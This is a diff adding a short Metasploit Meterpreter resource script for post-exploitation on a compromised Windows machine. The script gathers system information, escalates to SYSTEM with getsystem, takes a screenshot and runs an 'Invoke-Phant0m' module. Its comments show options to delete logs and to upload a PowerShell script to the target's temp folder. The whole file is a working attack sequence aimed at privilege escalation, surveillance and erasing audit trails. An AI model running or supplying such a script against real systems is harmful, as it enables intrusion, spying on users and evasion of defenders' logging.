@@ -1,0 +1,11 @@
+##
+# Add module auto-run options as 'arguments' to further enumeration ..
+# example: run post/windows/manage/Invoke-Phant0m DEL_LOGS=true
+# example: run post/windows/manage/Invoke-Phant0m SHOW_EVENTS=true
+# example: run post/windows/manage/Invoke-Phant0m UPLOAD="/tmp/Invoke-Phant0m.ps1" REMOTE="%temp%"
+##
+sysinfo
+getprivs
+getsystem
+screenshot -v -p Phantom.jpeg -v true
+run post/windows/manage/Invoke-Phant0m
